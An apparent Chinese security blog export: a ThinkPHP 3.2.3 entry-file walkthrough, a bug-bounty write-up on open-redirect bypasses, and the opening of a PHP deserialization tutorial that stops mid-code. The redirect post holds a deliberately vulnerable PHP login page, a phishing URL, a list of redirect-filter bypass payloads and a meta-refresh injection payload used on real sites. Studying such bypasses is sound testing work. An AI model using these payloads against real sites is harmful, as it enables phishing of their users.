    <content type="text"><![CDATA[tp3.2.3ÁõÆÂΩïÁªìÊûÑwww WEBÈÉ®ÁΩ≤ÁõÆÂΩïÔºàÊàñËÄÖÂ≠êÁõÆÂΩïÔºâ ‚îú‚îÄindex.php ÂÖ•Âè£Êñá‰ª∂ ‚îú‚îÄREADME.md READMEÊñá‰ª∂ ‚îú‚îÄApplication Â∫îÁî®ÁõÆÂΩï ‚îú‚îÄPublic ËµÑÊ∫êÊñá‰ª∂ÁõÆÂΩï ‚îî‚îÄThinkPHP Ê°ÜÊû∂ÁõÆÂΩïÈ¶ñÂÖàÈÄöËøáËß£ÊûêÈÄöËøáÂÖ•Âè£Êñá‰ª∂‚Äîindex.phpÔºåÂÖ•Âè£Êñá‰ª∂ÈùûÂ∏∏ÁÆÄÁü≠„ÄÇ &lt;?php // +---------------------------------------------------------------------- // | ThinkPHP [ WE CAN DO IT JUST THINK ] // +---------------------------------------------------------------------- // | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved. // +---------------------------------------------------------------------- // | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 ) // +---------------------------------------------------------------------- // | Author: liu21st &lt;liu21st@gmail.com&gt; // +---------------------------------------------------------------------- // Â∫îÁî®ÂÖ•Âè£Êñá‰ª∂ // Ê£ÄÊµãPHPÁéØÂ¢É if(version_compare(PHP_VERSION,&apos;5.3.0&apos;,&apos;&lt;&apos;)) die(&apos;require PHP &gt; 5.3.0 !&apos;); // ÂºÄÂêØË∞ÉËØïÊ®°Âºè Âª∫ËÆÆÂºÄÂèëÈò∂ÊÆµÂºÄÂêØ ÈÉ®ÁΩ≤Èò∂ÊÆµÊ≥®ÈáäÊàñËÄÖËÆæ‰∏∫false define(&apos;APP_DEBUG&apos;,True); // ÂÆö‰πâÂ∫îÁî®ÁõÆÂΩï define(&apos;APP_PATH&apos;,&apos;./Application/&apos;); // ÂºïÂÖ•ThinkPHPÂÖ•Âè£Êñá‰ª∂ require &apos;./ThinkPHP/ThinkPHP.php&apos;; // ‰∫≤^_^ ÂêéÈù¢‰∏çÈúÄË¶Å‰ªª‰Ωï‰ª£Á†Å‰∫Ü Â∞±ÊòØÂ¶ÇÊ≠§ÁÆÄÂçïÂÖàÊ£ÄÊµãPHPÁéØÂ¢ÉÔºåÁÑ∂ÂêéÈªòËÆ§ÂºÄÂêØË∞ÉËØïÊ®°ÂºèÔºåÂÆö‰πâAPP_PATH,ÁÑ∂ÂêéÂåÖÂê´ThinkPHP/ThinkPHP.phpÊñá‰ª∂ÔºåÈáçÁÇπÈÖçÁΩÆÂú®Thinkphp.phpÊñá‰ª∂Èáå Thinkphp.phpÊ°ÜÊû∂ÂÖ•Âè£Êñá‰ª∂„ÄÇ ‚îú‚îÄThinkPHP Ê°ÜÊû∂Á≥ªÁªüÁõÆÂΩïÔºàÂèØ‰ª•ÈÉ®ÁΩ≤Âú®ÈùûwebÁõÆÂΩï‰∏ãÈù¢Ôºâ ‚îÇ ‚îú‚îÄCommon Ê†∏ÂøÉÂÖ¨ÂÖ±ÂáΩÊï∞ÁõÆÂΩï ‚îÇ ‚îú‚îÄConf Ê†∏ÂøÉÈÖçÁΩÆÁõÆÂΩï ‚îÇ ‚îú‚îÄLang Ê†∏ÂøÉËØ≠Ë®ÄÂåÖÁõÆÂΩï ‚îÇ ‚îú‚îÄLibrary Ê°ÜÊû∂Á±ªÂ∫ìÁõÆÂΩï ‚îÇ ‚îÇ ‚îú‚îÄThink Ê†∏ÂøÉThinkÁ±ªÂ∫ìÂåÖÁõÆÂΩï ‚îÇ ‚îÇ ‚îú‚îÄBehavior Ë°å‰∏∫Á±ªÂ∫ìÁõÆÂΩï ‚îÇ ‚îÇ ‚îú‚îÄOrg OrgÁ±ªÂ∫ìÂåÖÁõÆÂΩï ‚îÇ ‚îÇ ‚îú‚îÄVendor Á¨¨‰∏âÊñπÁ±ªÂ∫ìÁõÆÂΩï ‚îÇ ‚îÇ ‚îú‚îÄ ... Êõ¥Â§öÁ±ªÂ∫ìÁõÆÂΩï ‚îÇ ‚îú‚îÄMode Ê°ÜÊû∂Â∫îÁî®Ê®°ÂºèÁõÆÂΩï ‚îÇ ‚îú‚îÄTpl Á≥ªÁªüÊ®°ÊùøÁõÆÂΩï ‚îÇ ‚îú‚îÄLICENSE.txt Ê°ÜÊû∂ÊéàÊùÉÂçèËÆÆÊñá‰ª∂ ‚îÇ ‚îú‚îÄlogo.png Ê°ÜÊû∂LOGOÊñá‰ª∂ ‚îÇ ‚îú‚îÄREADME.txt Ê°ÜÊû∂READMEÊñá‰ª∂ ‚îÇ ‚îî‚îÄThinkPHP.php Ê°ÜÊû∂ÂÖ•Âè£Êñá‰ª∂ defined(&apos;THINK_PATH&apos;) or define(&apos;THINK_PATH&apos;, __DIR__.&apos;/&apos;); defined(&apos;APP_PATH&apos;) or define(&apos;APP_PATH&apos;, dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]).&apos;/&apos;); defined(&apos;APP_STATUS&apos;) or define(&apos;APP_STATUS&apos;, &apos;&apos;); // Â∫îÁî®Áä∂ÊÄÅ Âä†ËΩΩÂØπÂ∫îÁöÑÈÖçÁΩÆÊñá‰ª∂ defined(&apos;APP_DEBUG&apos;) or define(&apos;APP_DEBUG&apos;, false); // ÊòØÂê¶Ë∞ÉËØïÊ®°ÂºèÊ£ÄÊü•ÊòØÂê¶ÂÆö‰πâ‰∫ÜËøô‰∫õÂèòÈáèÔºåÂ¶ÇÊûúÊ≤°ÂÆö‰πâÂàôÂÆö‰πâ„ÄÇ ÊúÄÂêé‰ª£Á†ÅÂä†ËΩΩÊ†∏ÂøÉÁ±ª„ÄÇ // Âä†ËΩΩÊ†∏ÂøÉThinkÁ±ª require CORE_PATH.&apos;Think&apos;.EXT; // Â∫îÁî®ÂàùÂßãÂåñ Think\Think::start(); LIB_PATH‰∏∫ ÂΩìÂâçÁõÆÂΩïÂä†library, defined(&apos;LIB_PATH&apos;) or define(&apos;LIB_PATH&apos;, realpath(THINK_PATH.&apos;Library&apos;).&apos;/&apos;); // Á≥ªÁªüÊ†∏ÂøÉÁ±ªÂ∫ìÁõÆÂΩï CORE_PATH‰∏∫ defined(&apos;CORE_PATH&apos;) or define(&apos;CORE_PATH&apos;, LIB_PATH.&apos;Think/&apos;); // ThinkÁ±ªÂ∫ìÁõÆÂΩïÂèÇËÄÉÔºöÂÆòÊñπÊâãÂÜå]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê∏óÈÄè‰πãurlË∑≥ËΩ¨]]></title>
    <url>%2F2019%2F05%2F17%2Furl%E8%B7%B3%E8%BD%AC%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÊúÄËøëÂú®‰∏Ä‰∫õÂéÇÂïÜÈ°πÁõÆ‰∏≠ÂºÄÂßãÊé•Ëß¶Âà∞‰∏Ä‰∫õurl‰ªªÊÑèÈáçÂÆöÂêëÔºåËôΩÁÑ∂ÊòØ‰ΩéÂç±ÔºåÂ•ñÈáëËæÉ‰ΩéÔºåÔºàËôΩÁÑ∂ÂõΩÂ§ñÂ∑≤ÁªèÊòØÂá†Áôæ$Ôºâ‰ΩÜÊòØ‰∏ÄÊó¶ÊâæÂà∞Á™ÅÁ†¥ÁÇπÔºåÂá†‰πéÊï¥‰∏™Á´ôÁöÑurlË∑≥ËΩ¨ÈÉΩÂèØ‰ª•bypassÔºå‰∏Ä‰∏™ÂéÇÂïÜÊâÄÊúâÁÇπÁöÑurlË∑≥ËΩ¨Âä†Ëµ∑Êù•Â•ñÈáë‰πüÊØîËæÉÂèØËßÇÔºåÊâÄ‰ª•Â∞ÜËá™Â∑±ÊåñÊéòËøáÁ®ã‰∏≠‰∏ÄÁÇπÁÇπÂøÉÂæóÂàÜ‰∫´‰∏Ä‰∏ã„ÄÇ ÁÆÄ‰ªãÂÖàËµ∞‰∏™ÊµÅÁ®ãËØ¥‰∫õÂ∫üËØùÔºåurlÈáçÂÆöÂêëÊºèÊ¥û‰πüÁß∞url‰ªªÊÑèË∑≥ËΩ¨ÊºèÊ¥ûÔºåÁΩëÁ´ô‰ø°‰ªª‰∫ÜÁî®Êà∑ÁöÑËæìÂÖ•ÂØºËá¥ÊÅ∂ÊÑèÊîªÂáªÔºåurlÈáçÂÆöÂêë‰∏ªË¶ÅÁî®Êù•ÈíìÈ±ºÔºåÊØîÂ¶ÇurlË∑≥ËΩ¨‰∏≠ÊúÄÂ∏∏ËßÅÁöÑË∑≥ËΩ¨Âú®ÁôªÈôÜÂè£ÔºåÊîØ‰ªòÂè£Ôºå‰πüÂ∞±ÊòØ‰∏ÄÊó¶ÁôªÈôÜÂ∞Ü‰ºöË∑≥ËΩ¨‰ªªÊÑèËá™Â∑±ÊûÑÈÄ†ÁöÑÁΩëÁ´ôÔºåÂ¶ÇÊûúËÆæÁΩÆÊàêËá™Â∑±ÁöÑurlÂàô‰ºöÈÄ†ÊàêÈíìÈ±ºÔºåÊµÖÊûêÂç±ÂÆ≥„ÄÇ &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form method=&quot;get&quot; action=&quot;url.php&quot;&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;&lt;br&gt; password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;ÁôªÈôÜ&quot; name=&quot;password&quot;&gt; &lt;/form&gt; &lt;?php $url=$_GET[&apos;redict&apos;]; echo $_GET[&apos;username&apos;]; if ($_GET[&apos;username&apos;]&amp;&amp;$_GET[&apos;password&apos;]) { header(&quot;Location:$url&quot;);exit; } ?&gt; ÊúÄÁÆÄÂçïÁöÑ‰ª£Á†ÅÂÆû‰æãÔºå‰πüÊòØÂæàË¥¥ËøëÁúüÂÆûÊ∏óÈÄèÁöÑÊ°à‰æãÔºåÁôªÈôÜË∑≥ËΩ¨ÔºåÂêéÈù¢ÈÄöÂ∏∏ÊòØÂä†‰∏äËá™Â∑±‰∏öÂä°ÁöÑurlÔºå‰∏ÄÊó¶Â≠òÂú®url‰ªªÊÑèÈáçÂÆöÂêëÔºåÂèëÈÄÅÁªôÁî®Êà∑Ôºå‰ºöÊØ´‰∏çÁñëÈóÆÁöÑËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÁôªÈôÜÔºåÁÑ∂ÂêéË∑≥ËΩ¨Âà∞Êàë‰ª¨ÊÉ≥Ë¶Å‰ªñË∑≥ËΩ¨ÁöÑurlÔºåÊØîÂ¶ÇÔºö Êàë‰ª¨ÂèëÈÄÅÁªôÁî®Êà∑ËøôÊ†∑ÁöÑurlÔºå http://127.0.0.1/url.php?username=&amp;password=&amp;redict=http://127.0.0.1/fish.phpÁî®Êà∑Ê≠£Â∏∏ËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÁôªÈôÜÁÇπÂáªÁôªÈôÜ„ÄÇË∑≥ËΩ¨Âà∞ÊûÑÈÄ†ÁöÑÈ°µÈù¢„ÄÇ(ÊàëÂèØÁúüÊòØ‰∏™ÈíìÈ±ºÈ¨ºÊâç) ÂΩìÁÑ∂ÈíìÈ±ºÁïåÈù¢ÂèØ‰ª•‰º™ÈÄ†‰∏ÄÂàá‰Ω†ÊÉ≥Ëé∑ÂèñÁöÑ‰ø°ÊÅØ„ÄÇ bypassÂÖ∂ÂÆûbypassÊ≤°‰ªÄ‰πàÊñ∞ÁöÑÂ•óË∑Ø(ÊàëÊöÇÊó∂Ê≤°)ÔºåÈÉΩÊòØÁΩë‰∏äÊúâÁöÑÔºåÂ∏àÂÇÖ‰ª¨ÂèØ‰ª•ÁôæÂ∫¶Âà∞ÁöÑÔºåÊàëÊï¥ÁêÜ‰∏Ä‰∏ãÔºåÂà©Áî®‰∏äÈù¢ÁöÑ‰ª£Á†ÅÁÆÄÂçïÊµãËØïÔºåÈÉΩÊòØÊú¨Âú∞ÊµãËØïÈÄöËøáÁöÑ„ÄÇwww.xiaozhupeiqi.comÊòØÊúçÂä°Âô®Ë¶ÅÊ±ÇË∑≥ËΩ¨ÁöÑurl„ÄÇ 1.ÊúÄÂ∏∏Áî®ÁöÑ‰∏ÄÊù°Ôºö@ÁªïËøá„ÄÇ http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.xiaozhupeiqi.com@www.baidu.com //ssrf‰πüÂèØÁî®2.ÁªïËøá‰∏Ä‰∫õÂåπÈÖçÁâπÂÆöÂ≠óÁ¨¶„ÄÇ ÔºüÁªïËøá http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com?www.xiaozhupeiqi.com#ÁªïËøá http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com#www.xiaozhupeiqi.com3.ÊñúÊù†/ÁªïËøá http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com/www.xiaozhupeiqi.comÊàñËÄÖÂèçÊñúÁ∫ø http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com\www.xiaozhupeiqi.com4.ÁôΩÂêçÂçïÂåπÈÖçÁªïËøá ÊØîÂ¶ÇÂåπÈÖçËßÑÂàôÊòØÂøÖÈ°ªË∑≥ËΩ¨Ôºåxiaozhupeiqi.com ÂüüÂêç‰∏ãÔºå?#Á≠âÈÉΩ‰∏çË°åÁöÑÊó∂ÂÄôÔºåÂ¶ÇÊûúÂåπÈÖçËßÑÂàô‰∏∫xiaozhupeiqi.comÔºåÂèØ‰ª•Â∞ùËØïÁôæÂ∫¶inurl:xiaozhupeiqi.comÁöÑÂüüÂêçÔºåÊØîÂ¶Ç aaaxiaozhupeiqi.comÔºåËøôÊ†∑ÂêåÊ†∑ÂèØ‰ª•ÁªïËøá„ÄÇÊé•‰∏ãÊù•ÂÆûÊàò‰∏≠‰ºöÁî®Âà∞Ôºå5.xip.ioÁªïËøá http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.xiaozhupeiqi.com.220.181.57.217.xip.io‰ºöË∑≥ËΩ¨Âà∞ÁôæÂ∫¶ 6.ÁêÜÊÉ≥ÂåñÊñπÊ≥ï Â¶ÇÊûúÊúâÊú∫‰ºöÂú®Ëá™Â∑±ÁöÑÈ°µÈù¢ËÆæÁΩÆurlË∑≥ËΩ¨ÔºåÊØîÂ¶ÇÁõÆÊ†áÁΩëÁ´ôÁöÑbbsËÆ∫ÂùõËá™Â∑±ÁöÑËµÑÊñôÈ°µÈù¢ËÆæÁΩÆurlË∑≥ËΩ¨ÔºåÊó¢ÁÑ∂ÊòØÊúçÂä°Âô®ÁöÑÁΩëÁ´ôÔºåÈÇ£‰πàurlÊòØ‰∏ç‰ºöÈôêÂà∂ÁöÑÔºåÂèØ‰ª•Áî®‰∏Ä‰∏™ÊºèÊ¥ûÂéªÊûÑÈÄ†Âè¶‰∏Ä‰∏™ÊºèÊ¥û„ÄÇ7.ÁôΩÂêçÂçïÁΩëÁ´ôÂèØ‰ø° Â¶ÇÊûúurlË∑≥ËΩ¨ÁÇπ‰ø°‰ªªÁôæÂ∫¶urlÔºågoogle urlÊàñËÄÖÂÖ∂‰ªñÔºåÂàôÂèØ‰ª•Â§öÊ¨°Ë∑≥ËΩ¨ËææÂà∞Ëá™Â∑±ÁöÑÊÅ∂ÊÑèÁïåÈù¢„ÄÇ8.ÂçèËÆÆÁªïËøá http‰∏éhttpsÂçèËÆÆËΩ¨Êç¢Â∞ùËØïÔºåÊàñËÄÖÁúÅÁï• http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=//www.xiaozhupeiqi.com@www.baidu.com http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=////www.xiaozhupeiqi.com@www.baidu.com//Â§öÊñúÁ∫ø9.xssË∑≥ËΩ¨ ËøôÁßçÂ∞±Ê≤°Âï•ËØ¥ÁöÑ‰∫ÜÔºåÂ∞±ÊòØXSSÈÄ†ÊàêÁöÑË∑≥ËΩ¨Ôºå‰∏ãÈù¢‰πüÊúâÊ°à‰æãÔºåÂú®Êúâ‰∫õÊÉÖÂÜµ‰∏ãXSSÂè™ËÉΩÈÄ†ÊàêË∑≥ËΩ¨ÁöÑÂç±ÂÆ≥„ÄÇ &lt;meta content=&quot;1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh&quot;&gt;fuzzÂá†‰∏™ÂèÇÊï∞redirect url redirectUrl callback return_url toUrl ReturnUrl fromUrl redUrl request redirect_to redirect_url jump jump_to target to link linkto domainÂÆûÊàòÂá†‰∏™Ê°à‰æã1.ÊúÄÂ∏∏ËßÅÁöÑÁôªÈôÜË∑≥ËΩ¨ ÁôªÈôÜË∑≥ËΩ¨ÊàëËÆ§‰∏∫ÊòØÊúÄÂ∏∏ËßÅÁöÑË∑≥ËΩ¨Á±ªÂûãÔºåÂá†‰πéÁôæÂàÜ‰πã‰∏ÉÂÖ´ÂçÅÁΩëÁ´ôÈÉΩ‰ºöurlÈáåËÆæÁΩÆË∑≥ËΩ¨ÔºåÊâÄ‰ª•Âú®ÁôªÈôÜÁöÑÊó∂ÂÄôÂª∫ËÆÆÂ§öËßÇÂØüurlÂèÇÊï∞ÔºåÈÄöÂ∏∏ÈÉΩ‰ºöÂ≠òÂú®Ë∑≥ËΩ¨Ëá≥‰∫éÂ≠ò‰∏çÂ≠òÂú®ÊºèÊ¥ûÈúÄË¶ÅËá™Â∑±ÊµãËØï„ÄÇ ‰∏äÈù¢ÁöÑÁ±ªÂûãÂõõ, ÊºèÊ¥ûurl Ôºö https://xx.xxx.com/User/Login?redirect=http://xxx.com/ ‰∏∫ÁôªÈôÜÈ°µÈù¢ÔºåÂ¶ÇÊûúÁôªÈôÜÊàêÂäüÈÇ£‰πàË∑≥ËΩ¨http://xxx.com/Ôºå‰ΩÜÊòØÊâÄÊúâÊñπÂºèÈÉΩÊó†Ê≥ïÁªïËøáÔºå‰ΩÜÊòØÂèëÁé∞ÂèØ‰ª•Ë∑≥ËΩ¨aaxxx.comÔºå‰πüÂ∞±ÊòØÂåπÈÖçËßÑÂàô‰∏∫ÂøÖÈ°ª‰∏∫xxx.comÁöÑÁΩëÂùÄÔºå‰ΩÜÊòØaaxxx.comÂêåÊ†∑‰πüÂèØ‰ª•„ÄÇ ÊñπÊ≥ïÔºö ÁôæÂ∫¶ inurl:xxx.comÔºåÂç≥ÂèØÁôæÂ∫¶Âà∞ÂæàÂ§öÂüüÂêçÂåÖÂê´xxx.comÁöÑurlÔºåÂç≥ÂèØÂÆûÁé∞Ë∑≥ËΩ¨,‰∏çÂ∞èÂøÉÁôæÂ∫¶Âà∞‰∏Ä‰∏™ÈªÑÂüüÔºåÊ≠£Â•ΩËØÅÊòéÂç±ÂÆ≥ÁôªÈôÜË∑≥XXÁΩë„ÄÇ ËøòÊúâ‰∏Ä‰∫õËä±ÈáåËÉ°Âì®ÁöÑbase64Âä†Á†Å‰∫ÜÁöÑË∑≥ËΩ¨ÔºåËß£Á†ÅÂ∞±ÊòØÈúÄË¶ÅË∑≥ËΩ¨ÁöÑurl,ÂÖ∂ÂÆûÊú¨Ë¥®ÈÉΩ‰∏ÄÊ†∑Ôºå 2.@ÁªïËøá @ÊòØÊúÄÂ∏∏ËßÅÁöÑ‰∏ÄÁßçÁªïËøá„ÄÇ ÊºèÊ¥ûurl https://xx.xxx.com/user/goToLogin?toUrl=https://xx.xxx.com@www.baidu.comËøôÁßçË∑≥ËΩ¨Âú®chromeÊµèËßàÂô®ÂèØ‰ª•Áõ¥Êé•Ë∑≥ËΩ¨Ôºå‰ΩÜÊòØÂú®ÁÅ´Áãê‰ºöÂºπÊ°ÜËØ¢ÈóÆÔºå‰ΩÜÊòØÂπ∂‰∏çÂΩ±ÂìçÂÆÉÁöÑÂç±ÂÆ≥„ÄÇ ÁÅ´Áãê‰∏ã@ÁöÑË∑≥ËΩ¨„ÄÇ ËøòÊúâ‰∏Ä‰∫õÊòØË∑≥ËΩ¨ÁõÆÂΩïÁöÑÔºå Â¶ÇÔºö https://xx.xxx.com.cn/?redirect=/user/info.php‰øÆÊîπ‰∏∫ https://xx.xxx.com.cn/?redirect=@www.baidu.comËøôÁßçÊÉÖÂÜµÈÄöÂ∏∏@‰πüÂèØ‰ª•Ë∑≥ËΩ¨ÔºåÂ§ßËÉÜÁöÑÂéªÂ∞ùËØï 3.ÂÖÖÂÄºÊé•Âè£Ë∑≥ËΩ¨ ÈÄöÂ∏∏ÂÖÖÂÄºÊé•Âè£ÈÉΩ‰ºöËøõË°åË∑≥ËΩ¨ÔºåÂ¶ÇÂÖÖÂÄºÊàêÂäü‰ºöË∑≥ËΩ¨Âà∞ÂÖÖÂÄºÂâçËÆøÈóÆÁöÑÈ°µÈù¢ÔºåÂõ†‰∏∫ÂÖÖÂÄºÊé•Âè£ÈúÄË¶ÅÂÖÖÂÄºÊâçËÉΩÁü•ÈÅìÂà∞Â∫ïÂ≠ò‰∏çÂ≠òÂú®ÊºèÊ¥ûÔºåÊâÄ‰ª•ÊµãËØïÁöÑ‰∫∫Áõ∏ÂØπÂ∞ë‰∏Ä‰∫õÔºåÂ§ßËÉÜÂéªÂ∞ùËØïÔºåÂçïËΩ¶ÂèòÊë©ÊâòÔºåÂÖÖÂÄºÂÆåÊàêÂêéËøòÂèØ‰ª•ÊèêÁé∞ÂÖ∂ÂÆûÂπ∂‰∏çÂΩ±ÂìçÔºå‰∏çÂ´åÈ∫ªÁÉ¶Â∞±Â§öÊµãÊµã„ÄÇËøô‰∫õÈÉΩÊòØË∑≥ËΩ¨ÊàêÂäüÁöÑÊ°à‰æã„ÄÇ 4.xssÈÄ†ÊàêÁöÑurlË∑≥ËΩ¨ Âú®‰∏ÄÊ¨°Ê∏óÈÄèÊµãËØï‰∏≠ÔºåÁ¢∞Âà∞‰∏Ä‰∏™Á´ôÁÇπÔºåÂØπ&lt;&gt;‚ÄùËøô‰∫õÂ≠óÁ¨¶ÈÉΩÊòØËøõË°å‰∫ÜËøáÊª§„ÄÇ‰∏îÊ≤°ÊúâÂÖ∂‰ªñÂßøÂäøÈÖçÂêàÔºåÂü∫Êú¨‰∏äÂëäÂà´‰∫ÜXSSÁ≠âÊºèÊ¥û„ÄÇÂ¶Ç‰∏ã ÂèØ‰ª•ÂèëÁé∞ÊàëËæìÂÖ•‰∫Üxsstest&lt;&gt;‚ÄùÔºå‰ΩÜÊòØ&lt;&gt;Ë¢´Áõ¥Êé•Âà†Èô§ËøáÊª§Êéâ‰∫ÜÔºå‰ΩÜÊòØÂèëÁé∞ÂèåÂºïÂè∑ËøòÂú®ÔºåÂÖàÁúã‰∏ãÊ∫êÁ†ÅÊòØÊÄé‰πàÂ§ÑÁêÜÁöÑ„ÄÇ ‰πç‰∏ÄÁúãÂèåÂºïÂè∑‰πüË¢´ËΩ¨‰πâ‰∫ÜÔºåËæìÂÖ•ÁöÑxsstest ÊêúÁ¥¢ÊúâÂçÅ‰∏ÉÂ§ÑÔºåÂ§ßÈÉ®ÂàÜË¢´ÂÆû‰ΩìÂåñ‰∫ÜÔºåËøòÊúâ‰∏ÄÈÉ®ÂàÜÂèåÂºïÂè∑Ë¢´urlÁºñÁ†Å‰∫ÜÔºå‰ΩÜÊòØÊ≠§Êó∂Á™ÅÁÑ∂ÂèëÁé∞ÊàëÁÆ≠Â§¥ÊåáÁöÑ‰∏ÄÂ§ÑÂπ∂Êú™ÂØπÂèåÂºïÂè∑ËøõË°åËΩ¨‰πâÊàñËÄÖËøáÊª§ÔºåËôΩÁÑ∂&lt;&gt;Â∑≤ÁªèÂÆåÂÖ®Ë¢´ËøáÊª§Êéâ‰∫Ü„ÄÇ Ê≠§Êó∂ÊûÑÈÄ†metaÁöÑurlË∑≥ËΩ¨„ÄÇ payloadÔºö http://xxx.com/search?w=1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh&amp;fsearch=yesÂÖ∂‰∏≠ËæìÂÖ• 1;url=http://www.baidu.com&quot; http-equiv=&quot;refreshÊúÄÁªàÈó≠ÂêàÊéâÂæóÂà∞ÁöÑÊ∫êÁ†Å‰∏∫„ÄÇ ÊúÄÁªàÁÇπÂáªpayload‰ºöË∑≥ËΩ¨ÁôæÂ∫¶È°µÈù¢ÔºåÂÖ∂ÂÆûËøô‰∏™‰∏•Ê†ºÊÑè‰πâ‰∏äÊù•ËØ¥ÁÆóXSSÈÄ†ÊàêÁöÑË∑≥ËΩ¨ÔºåÊûÑÈÄ†Â∫îËØ•‰πüÂèØ‰ª•XSS„ÄÇ 5.‰∏öÂä°ÂÆåÊàêÂêéË∑≥ËΩ¨ ËøôÂèØ‰ª•ÂΩíÁªì‰∏∫‰∏ÄÁ±ªË∑≥ËΩ¨ÔºåÊØîÂ¶Ç‰øÆÊîπÂØÜÁ†ÅÔºå‰øÆÊîπÂÆåÊàêÂêéË∑≥ËΩ¨ÁôªÈôÜÈ°µÈù¢ÔºåÁªëÂÆöÈì∂Ë°åÂç°ÔºåÁªëÂÆöÊàêÂäüÂêéËøîÂõûÈì∂Ë°åÂç°ÂÖÖÂÄºÁ≠âÈ°µÈù¢ÔºåÊàñËÄÖËØ¥ÁªôÂÆö‰∏Ä‰∏™ÈìæÊé•ÂäûÁêÜVIPÔºå‰ΩÜÊòØ‰Ω†ÈúÄË¶ÅËÆ§ËØÅË∫´‰ªΩÊâçËÉΩËÆøÈóÆËøô‰∏™‰∏öÂä°ÔºåËøô‰∏™Êó∂ÂÄôÈÄöÂ∏∏‰ºöÁªôÂÆö‰∏Ä‰∏™ÈìæÊé•ÔºåËÆ§ËØÅ‰πãÂêéË∑≥ËΩ¨Âà∞ÂàöÂàöË¶ÅÂäûÁêÜVIPÁöÑÈ°µÈù¢„ÄÇ ÈÄöÂ∏∏Ëøô‰∏™ÁÇπÈÉΩ‰ºöÂ≠òÂú®Ë∑≥ËΩ¨Ëá≥‰∫éÂ≠ò‰∏çÂ≠òÂú®‰ªªÊÑèË∑≥ËΩ¨ÔºåÂ∏àÂÇÖ‰ª¨Ëá™Êµã,Êúâ‰∫õË∑≥ËΩ¨‰∏öÂä°‰∏çÂ•ΩÁ†ÅÂ∞±‰∏çÂèë‰∫Ü„ÄÇ 6.Áî®Êà∑‰∫§‰∫í Âú®‰∏Ä‰∫õÁî®Êà∑‰∫§‰∫íÈ°µÈù¢‰πü‰ºöÂá∫Áé∞Ë∑≥ËΩ¨ÔºåÂ¶ÇËØ∑Â°´ÂÜôÂØπÂÆ¢ÊúçËØÑ‰ª∑ÔºåËØÑ‰ª∑ÊàêÂäüË∑≥ËΩ¨‰∏ªÈ°µÔºåÂ°´ÂÜôÈóÆÂç∑ÔºåÁ≠âÁ≠â‰∏öÂä°ÔºåÊ≥®ÊÑèËßÇÂØüurl„ÄÇ ÈóÆÂç∑Ë∞ÉÊü•Êèê‰∫§Ë∑≥ËΩ¨„ÄÇ ps:Â¶ÇÊûúÊúâÂÖ∂‰ªñÂ∞èÊäÄÂ∑ßÊàë‰ºöÊõ¥Êñ∞Âà∞Êú¨ÁØáÊñáÁ´†„ÄÇ ÂèÇËÄÉÔºöhttps://www.anquanke.com/post/id/94377?from=singlemessage]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPÂèçÂ∫èÂàóÂåñÂ≠¶‰π†]]></title>
    <url>%2F2019%2F04%2F20%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[PHPÂ∫èÂàóÂåñÊµÖÊûêÈ¶ñÂÖàÁÆÄÂçï‰∫ÜËß£‰∏ãPHP Â∫èÂàóÂåñÂáΩÊï∞ÔºåPHPÂ∫èÂàóÂåñÊòØÂ∞Ü‰∏Ä‰∏™ÂØπË±°„ÄÅÊï∞ÁªÑ„ÄÅÂ≠óÁ¨¶‰∏≤Á≠âËΩ¨Âåñ‰∏∫Â≠óËäÇÊµÅ‰æø‰∫é‰º†ËæìÔºåÊØîÂ¶ÇË∑®ËÑöÊú¨Á≠â„ÄÇËÄåPHPÂèçÂ∫èÂàóÂåñÊòØÂ∞ÜÂ∫èÂàóÂåñ‰πãÂêéÁöÑÂ≠óËäÇÊµÅËøòÂéüÊàêÂØπË±°„ÄÅÂ≠óÁ¨¶„ÄÅÊï∞ÁªÑÁ≠â„ÄÇ‰ΩÜÊòØPHPÂ∫èÂàóÂåñÊòØ‰∏ç‰ºö‰øùÂ≠òÂØπË±°ÁöÑÊñπÊ≥ï„ÄÇ PHP‰ª£Á†ÅÂÆû‰æã„ÄÇ Â∫èÂàóÂåñÊ†ºÂºè„ÄÇ &lt;?php class CB { public $CB_data = &apos;cb&apos;; } class test extends CB { public $data; public $pass; const SECOND = 60;//Â∏∏ÈáèÂÄº public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } } $number = 66; $str = &apos;String&apos;; $bool = true; $null = NULL; $arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2); $cc = new test(&apos;peiqi&apos;, true); $a=serialize($cc); echo $a; echo unserialize($a); echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($number));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($str));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($bool));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($null));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($arr));echo 